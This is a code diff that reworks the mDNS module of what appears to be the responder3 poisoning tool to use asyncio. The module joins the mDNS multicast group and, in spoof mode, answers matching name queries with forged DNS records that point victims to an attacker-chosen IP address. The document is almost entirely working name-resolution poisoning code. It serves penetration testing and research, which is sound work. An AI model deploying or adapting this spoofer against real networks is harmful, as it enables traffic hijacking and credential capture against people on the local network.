@@ -1,30 +1,50 @@
-import re
-import os
-import io
-import logging
-import traceback
 import socket
 import struct
-import enum
-import traceback
+import logging
+import asyncio
 import ipaddress
+import traceback
 
-from responder3.protocols.DNS import * 
-from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode
+from responder3.core.commons import *
+from responder3.core.udpwrapper import UDPClient
+from responder3.core.servertemplate import ResponderServer, ResponderServerSession
+from responder3.protocols.DNS import *
 
-class MDNSSession(ProtocolSession):
-	def __init__(self, server):
-		ProtocolSession.__init__(self, server)
+
+class MDNSSession(ResponderServerSession):
+	pass
 
 class MDNS(ResponderServer):
-	def __init__(self):
-		ResponderServer.__init__(self)
+	def custom_socket(server_properties):
+		if server_properties.bind_addr.version == 4:
+			mcast_addr = ipaddress.ip_address('224.0.0.251')
+			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
+			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
+			sock.bind(('0.0.0.0', server_properties.bind_port))
+			mreq = struct.pack("=4sl", mcast_addr.packed, socket.INADDR_ANY)
+			sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+			
+		else:
+			ip = ipaddress.ip_address('FF02::FB')
+			interface_index = socket.if_nametoindex(server_properties.bind_iface)
+			sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
+			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+			sock.bind(('::', server_properties.bind_port, 0, interface_index))
+			sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP,
+				struct.pack('16sI', ip.packed, interface_index))
+			
+		return sock
 
-	def modulename(self):
-		return 'MDNS'
-
-	def setup(self):
-		self.protocol = MDNSProtocol
+	def init(self):
+		self.maddr = ('224.0.0.251' , 5353)
+		if self.sprops.bind_addr.version == 6:
+			interface_index = socket.if_nametoindex(self.sprops.bind_iface)
+			self.maddr = ('FF02::FB' , 5353,0, interface_index)
+		
+		self.parser = DNSPacket
 		self.spoofTable = []
 		if self.settings is None:
 			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
@@ -38,44 +58,39 @@ class MDNS(ResponderServer):
 
 			#compiling re strings to actual re objects and converting IP strings to IP objects
 			if self.settings['mode'] == PoisonerMode.SPOOF:
-				for exp in self.settings['spoofTable']:
+				for exp in self.settings['spooftable']:
 					if exp == 'ALL':
-						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
+						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spooftable'][exp])))
 						continue
-					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))
+					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))
 
+	@asyncio.coroutine
+	def parse_message(self):
+		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
+		return msg
+
+	@asyncio.coroutine
+	def send_data(self, data, addr):
+		#we need to set the addr here, because we are sending the packet to the multicast address, not to the clinet itself
+		#however there could be cases that the client accepts unicast, but it's ignored for now
+		yield from asyncio.wait_for(self.cwriter.write(data, addr), timeout=1)
+		return
+	
+	@asyncio.coroutine
 	def run(self):
-		#need to do some wizardy with the socket setting here
-		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-		sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-		sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-		sock.bind(('', self.bind_port))
-		mreq = struct.pack("=4sl", self.bind_addr.packed, socket.INADDR_ANY)
-		sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
-
-		coro = self.loop.create_datagram_endpoint(
-							protocol_factory=lambda: MDNSProtocol(self),
-							sock = sock
-		)
-
-		return self.loop.run_until_complete(coro)
-
-	def handle(self, packet, addr, transport, session):
-		if 'R3DEEPDEBUG' in os.environ:
-				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
 		try:
-			#only care about the requests
-			if packet.QR == DNSResponse.REQUEST:
+			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
+			if msg.QR == DNSResponse.REQUEST:
 				if self.settings['mode'] == PoisonerMode.ANALYSE:
-					for q in packet.Questions:
-						self.logPoisonResult(session, requestName = q.QNAME.name)
+					for q in msg.Questions:
+						self.logPoisonResult(requestName = q.QNAME.name)
 
 				else:
 					answers = []
 					for targetRE, ip in self.spoofTable:
-						for q in packet.Questions:
+						for q in msg.Questions:
 							if targetRE.match(q.QNAME.name):
-								self.logPoisonResult(session, requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
+								self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
 								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
 								if ip.version == 4:
 									res = DNSAResource.construct(q.QNAME.name, ip)
@@ -86,27 +101,14 @@ class MDNS(ResponderServer):
 								#res.construct(q.QNAME, NBRType.NB, ip)
 								answers.append(res)
 					
-					response = DNSPacket.construct(TID = packet.TransactionID, 
-													 response  = DNSResponse.RESPONSE, 
-													 answers   = answers,
-													 questions = packet.Questions)
+					response = DNSPacket.construct(TID = msg.TransactionID, 
+													 response    = DNSResponse.RESPONSE, 
+													 additionals = answers,
+													 questions   = msg.Questions)
 
-					transport.sendto(response.toBytes(), addr)
-
-			
+					yield from asyncio.wait_for(self.send_data(response.toBytes(), self.maddr), timeout=1)
 
 		except Exception as e:
 			traceback.print_exc()
-			self.log(logging.INFO,'Exception! %s' % (str(e),))
+			self.log('Exception! %s' % (str(e),))
 			pass
-
-class MDNSProtocol(ResponderProtocolUDP):
-	
-	def __init__(self, server):
-		ResponderProtocolUDP.__init__(self, server)
-		self._session = MDNSSession(server.rdnsd)
-
-	def _parsebuff(self, addr):
-		packet = DNSPacket.from_bytes(self._buffer)
-		self._server.handle(packet, addr, self._transport, self._session)
-		self._buffer = b''
